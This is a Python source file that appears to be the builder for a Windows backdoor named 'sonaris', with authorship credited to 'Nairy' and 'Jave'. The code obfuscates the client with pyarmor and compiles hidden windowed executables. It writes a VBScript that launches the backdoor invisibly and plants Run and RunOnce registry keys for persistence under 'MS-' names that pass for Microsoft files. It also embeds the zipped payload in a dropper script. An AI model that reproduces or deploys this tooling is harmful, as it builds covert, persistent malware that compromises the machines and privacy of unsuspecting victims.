#!/usr/bin/python3
# coding: utf-8

__authors__ = "{Nairy's} {Jave's}"
__version__ = 'linux - win10 - win7'
__contact__ = '{__Nairy__#7181}'

import os, sys
import json
import pathlib
import shutil

class Generator:
    @staticmethod
    def RootZipFile(name):
        print('  [*] Generating the zip file of backdoor...', end='\r')
        shutil.make_archive(f'zip/{name}/', 'zip', 'dist')

    @staticmethod
    def BridgeZipFile(name):
        os.mkdir('zipbridge')
        shutil.move(f'dist/{name}.exe', 'zipbridge/')
        print('  [*] Generating the zip file of bridge...', end='\r')
        shutil.make_archive(name, 'zip', 'zipbridge')
        shutil.move(f'{name}.zip', 'zipbridge/')

    @staticmethod
    def EncodedBackdoorString(name):
        print('  [*] Generating bytes of zip file...', end='\r')
        # generate encoded backdoor string #
        with open(f'zip/{name}.zip', 'rb') as file:
            EncodedBackdoorString = file.read()
        # generate encoded string of bridge program #
        with open(f'zipbridge/{name}.zip', 'rb') as file:
            EncodedBridgeString = file.read()
        # get index of lines #
        with open('main.py', 'r') as _file:
            _file = _file.readlines()
            for line in _file:
                if('win32api.RegSetValue' in line):
                    reg_index = _file.index(line)
                elif('BackdoorProgram = ' in line):
                    bck_index = _file.index(line)
                elif('BridgeProgram = ' in line):
                    brd_index = _file.index(line)
                elif('DecompressFiles.DecompressBackdoor' in line):
                    bck_name_and_path = _file.index(line)
                elif('DecompressFiles.DecompressBridge' in line):
                    brd_name_and_path = _file.index(line)

            return [
                EncodedBackdoorString,
                reg_index,
                bck_index,
                bck_name_and_path,
                _file,
                brd_index,
                EncodedBridgeString,
                brd_name_and_path]

class Backdoor:
    @staticmethod
    def CreateByModel(name):
        print(f' * Copying the client backdoor model...')
        with open('model/sonaris_client.py', 'rb') as model:
            model = model.read()
        
        with open(f'{name}.py', 'wb') as bck:
            bck.write(model)

class MainProgram:
    @staticmethod
    def CreateByModel():
        print('  * Copying the main program model...       ', end='\r')
        with open('model/main.py', 'rb') as model:
            model = model.read()
        
        with open('main.py', 'wb') as main:
            main.write(model)

class Checker:
    @staticmethod
    def CreateByModel(name):
        print(f' * Copying the checker model...')
        with open('model/checker.py', 'rb') as model:
            model = model.read()

        with open(f'{name}.py', 'wb') as checker:
            checker.write(model)

    @staticmethod
    def Move(checkername, rootfolder):
        print(f' * Moving checker file to rootfolder...')
        shutil.move(f'dist/{checkername}.exe', f'dist/{rootfolder}/')

class ClientCompile:
    @staticmethod
    def Backdoor(name):
        print(' * Compiling the client backdoor program...')
        try:
            os.system(f'pyarmor pack {name}.py')
        except Exception as e:
            print(e)
            sys.exit()
    
    @staticmethod
    def BackdoorBridge(name):
        print(' * Compiling the bridge program...')
        if(pathlib.Path('icons/icon.ico').is_file() == True):
            try:
                os.system(f'pyinstaller -F --windowed -i icons\icon.ico {name}.py')
            except Exception as e:
                print(e)
                sys.exit()
        else:
            try:
                os.system(f'pyinstaller -F --windowed {name}.py')
            except Exception as e:
                print(e)
                sys.exit()

    @staticmethod
    def Checker(name):
        print(f' * Compiling the checker program...')
        if(pathlib.Path('icons/icon.ico').is_file() == True):
            try:
                os.system(f'pyinstaller -F --windowed -i icons\icon.ico {name}.py')
            except Exception as e:
                print(e)
                sys.exit()
        else:
            try:
                os.system(f'pyinstaller -F --windowed -i {name}.py')
            except Exception as e:
                print(e)
                sys.exit()

class ClientConfig:
    ''' Configuration of files '''
    @staticmethod
    def OpenConfigClient():
        try:
            with open('config.json', 'rb') as file:
                file = file.read()
            
            return json.loads(file)

        except Exception as e:
            print(e)
            sys.exit()

    @staticmethod
    def SetConfigurationClient(configuration, data, bckmodifypath):
        print('  * Copying bytes to main program and setting configurations', end='\r')
        # writing encoded strings in main file and name of files#
        with open('main.py', 'w') as file:
            for line in data[4]:
                if(data[4].index(line) == data[1]):
                    name = configuration["config"]["namefile"]["backdoor"]
                    path = configuration["config"]["path"]["root"].replace("/", "\\\\")
                    file.write(f'{" "*12}win32api.RegSetValue(hkey, "RunOnce", win32con.REG_SZ, f"{path}\\\\{name}\\\\MS-{name}.exe")\n')
                elif(data[4].index(line) == data[2]):
                    file.write(f'{" "*8}BackdoorProgram = {data[0]}\n')
                elif(data[4].index(line) == data[5]):
                    file.write(f'{" "*8}BridgeProgram = {data[6]}\n')
                elif(data[4].index(line) == data[3]):
                    file.write(f'{" "*4}_namefile, _path = DecompressFiles.DecompressBackdoor("{configuration["config"]["namefile"]["backdoor"]}.zip", f"{configuration["config"]["path"]["root"]}/")\n')
                elif(data[4].index(line) == data[7]):
                    file.write(f'{" "*4}namefile, path = DecompressFiles.DecompressBridge("{configuration["config"]["namefile"]["backdoor"]}.zip", f"{configuration["config"]["path"]["backdoor"]}/")\n')
                else:
                    file.write(line)
            
            file.close()

    @staticmethod
    def VerifyConfiguration(config):
        if(config['config']['namefile']['backdoor'] != "" and config['config']['namefile']['vbscript'] != ""):
            if(config['config']['path']['backdoor'] != "" and config['config']['path']['root'] != ""):
                # modify path to regedit #
                bck_modify_path = config['config']['path']['backdoor'] + '\\\\' + config['config']['namefile']['backdoor']

                return config, bck_modify_path.replace('/', '\\\\')
            
            else:
                print('  Error: Configuration file: "path" of backdoor or root folder is empty...')
                sys.exit(0)
        else:
            print('  Error: Configuration file: "namefile" of backdoor or vbscript is empty...')
            sys.exit(0)

    @staticmethod
    def SetConfigurationVbs(bckpath, bckname, vbname):
        with open(f'dist/{bckname}/{vbname}.vbs', 'w') as vb_file:
            vb_file.write(f'Dim {vbname}\nset {vbname} = WScript.CreateObject ("WScript.shell")\n{vbname}.run "{bckname}.exe", 0')
            vb_file.close()
            print(' * Configuration vbs file successfully...')
    
    @staticmethod
    def SetConfigurationBridge(bckname, rootpath, vbsfile):
        print(f' * Setting the bridge file configuration...')
        with open(f'{bckname}.py', 'w') as bridge_file:
            bridge_file.write(f'# coding: utf-8\nfrom os import startfile, chdir\nfrom getpass import getuser\nuser = getuser()\n\ntry:\n    chdir(f"{rootpath}/{bckname}")\n    startfile("{vbsfile}.vbs")\nexcept Exception:\n    pass')
            bridge_file.close()

    @staticmethod
    def SetConfigurationChecker(checkername, bckpath, rootfolder):
        print(f' * Setting the checker file configuration...')
        with open(f'{checkername}.py', 'r') as _file:
            _file = _file.readlines()
            for line in _file:
                if('win32api.RegSetValue(hkey, "RunOnce"' in line):
                    runonce = _file.index(line)
                elif('win32api.RegSetValue(hkey, "Run"' in line):
                    run = _file.index(line)
        
        with open(f'{checkername}.py', 'w') as checkerfile:
            for line in _file:
                if(_file.index(line) == runonce):
                    rootname = checkername.replace('MS-', '')
                    checkerfile.write(f'{" "*8}win32api.RegSetValue(hkey, "RunOnce", win32con.REG_SZ, f"{rootfolder}\\\\{rootname}\\\\{checkername}.exe")\n')
                elif(_file.index(line) == run):
                    checkerfile.write(f'{" "*8}win32api.RegSetValue(hkey, "Run", win32con.REG_SZ, f"{bckpath}.exe")\n')
                else:
                    checkerfile.write(line)

            checkerfile.close()

def main():
    configuration, bck_modify_path = ClientConfig.VerifyConfiguration(ClientConfig.OpenConfigClient())
    try:
        if(sys.argv[1] == '--compile-backdoor'):
            Backdoor.CreateByModel(configuration['config']['namefile']['backdoor'])
            ClientCompile.Backdoor(configuration['config']['namefile']['backdoor'])
            ClientConfig.SetConfigurationBridge(configuration['config']['namefile']['backdoor'], configuration['config']['path']['root'], configuration['config']['namefile']['vbscript'])
            ClientCompile.BackdoorBridge(configuration['config']['namefile']['backdoor'])
            Generator.BridgeZipFile(configuration['config']['namefile']['backdoor'])
            Checker.CreateByModel(f'MS-{configuration["config"]["namefile"]["backdoor"]}')
            ClientConfig.SetConfigurationChecker(f'MS-{configuration["config"]["namefile"]["backdoor"]}', bck_modify_path, configuration['config']['path']['root'].replace("/", "\\\\"))
            ClientCompile.Checker(f'MS-{configuration["config"]["namefile"]["backdoor"]}')
            Checker.Move(f'MS-{configuration["config"]["namefile"]["backdoor"]}', configuration["config"]["namefile"]["backdoor"])

            if(pathlib.Path(f'dist/{configuration["config"]["namefile"]["backdoor"]}/{configuration["config"]["namefile"]["backdoor"]}.exe').is_file() == True):
                print(' * Compilation finished...')
                print(f' * Setting the vbs file configuration in [/dist/{configuration["config"]["namefile"]["backdoor"]}/{configuration["config"]["namefile"]["backdoor"]}.vbs]')
                ClientConfig.SetConfigurationVbs(bck_modify_path.replace('\\\\', '\\'), configuration['config']['namefile']['backdoor'], configuration['config']['namefile']['vbscript'])
            else:
                print('  Error: Compilation failed...    ')
        else:
            print('  Error: invalid arguments...')

    except Exception:
        if(pathlib.Path(f'dist/{configuration["config"]["namefile"]["backdoor"]}/{configuration["config"]["namefile"]["backdoor"]}.exe').is_file() == True):
            Generator.RootZipFile(configuration["config"]["namefile"]["backdoor"])
            MainProgram.CreateByModel()
            data = Generator.EncodedBackdoorString(configuration["config"]["namefile"]["backdoor"])
            ClientConfig.SetConfigurationClient(configuration, data, bck_modify_path)
            print('  Done!                                                         ')
        else:
            print('  Error: no compiled files found...  use argv: --compile-backdoor')

if __name__ == '__main__':
    main()